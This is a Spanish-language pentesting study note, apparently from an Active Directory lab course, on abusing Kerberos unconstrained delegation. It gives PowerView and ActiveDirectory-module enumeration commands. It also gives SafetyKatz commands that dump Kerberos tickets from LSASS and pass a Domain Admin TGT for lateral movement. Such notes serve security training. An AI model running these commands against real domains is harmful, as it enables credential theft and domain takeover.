# Kerberos Delegation 

Tags: #AD #Unconstrained_Delegation 

- **Kerberos Delegation** permite “reutilizar las credenciales del usuario final para acceder a recursos alojados en otro servidor”.
- Esto es típicamente útil en servicios o aplicaciones de múltiples capas donde se requiere el **doble salto (Kerberos Double Hop)**. Por ejemplo, un usuario se autentica en un servidor web (primer salto) y el servidor web realiza peticiones a un servidor de base de datos (segundo salto).
- La **suplantación de usuario (impersonation)** es el objetivo de la delegación.

![](Pasted%20image%2020260420173049.png)

# Unconstrained Delegation 

- Permite la delegación hacia cualquier servicio y cualquier recurso dentro del dominio, actuando como un usuario.
- Cuando la **delegación no restringida (unconstrained delegation)** está habilitada, el Domain Controller coloca el **TGT del usuario dentro del TGS**. En el primer salto, el TGT es extraído del TGS y almacenado en **LSASS**. De esta forma, el servidor puede reutilizar el TGT del usuario para acceder a cualquier otro recurso como si fuera ese usuario.
- ¡Esto es altamente susceptible de abuso!

```powershell 
! Usuario: Usuario de dominio

❯ Get-DomainComputer -UnConstrained
❯ Get-DomainComputer -UnConstrained | select -ExpandProperty samaccountname 
# Enumerar equipos del dominio con Unconstrained Delegation habilitada usando PowerView — candidatos para capturar TGTs de usuarios que se conecten a ellos.

❯ Get-ADComputer -Filter {TrustedForDelegation -eq $True}
❯ Get-ADComputer -Identity server2 -Properties TrustedForDelegation, msDS-AllowedToDelegateTo
# Enumerar equipos con Unconstrained Delegation usando el módulo ActiveDirectory nativo.

❯ Get-ADUser -Filter {TrustedForDelegation -eq $True}
# Enumerar cuentas de usuario con Unconstrained Delegation habilitada usando el módulo ActiveDirectory nativo.
```

```powershell 
# Comprometer el/los servidor(es) donde la delegación no restringida (Unconstrained Delegation) esté habilitada.
# Debemos engañar o esperar a que un Domain Admin se conecte a un servicio en el servidor de aplicaciones (appsrv).

! Usuario: Administrador local del servidor con Unconstrained Delegation

❯ SafetyKatz.exe "sekurlsa::tickets /export"
# Exportar todos los tickets Kerberos en memoria a archivos .kirbi — tras esperar/forzar que un DA se conecte al servidor, su TGT quedará almacenado en LSASS.

❯ Safetykatz.exe "kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"
# Inyectar el TGT del Administrator exportado en la sesión actual para reutilizar su token y moverse lateralmente como DA.
```


![](Pasted%20image%2020260420174244.png)